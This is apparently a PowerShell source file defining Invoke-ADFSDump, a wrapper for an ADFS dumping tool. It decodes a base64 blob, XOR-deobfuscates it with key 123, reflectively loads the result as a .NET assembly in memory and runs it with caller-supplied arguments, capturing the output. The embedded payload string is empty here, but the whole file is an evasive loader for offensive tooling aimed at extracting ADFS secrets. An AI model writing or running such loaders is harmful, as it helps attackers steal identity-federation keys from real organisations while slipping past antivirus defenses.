function Invoke-ADFSDump {
    param (
        [string]$Params
    )
    if (!$fileassembly) {
        $xorfilebytes = [Convert]::FromBase64String("");
        for($i=0; $i -lt $xorfilebytes.count ; $i++){ $xorfilebytes[$i] = $xorfilebytes[$i] -bxor 123 };
        $fileassembly = [System.Reflection.Assembly]::Load($xorfilebytes)
    }
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    $fileassembly.EntryPoint.Invoke($null,(, $Params.split()))
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
    
}
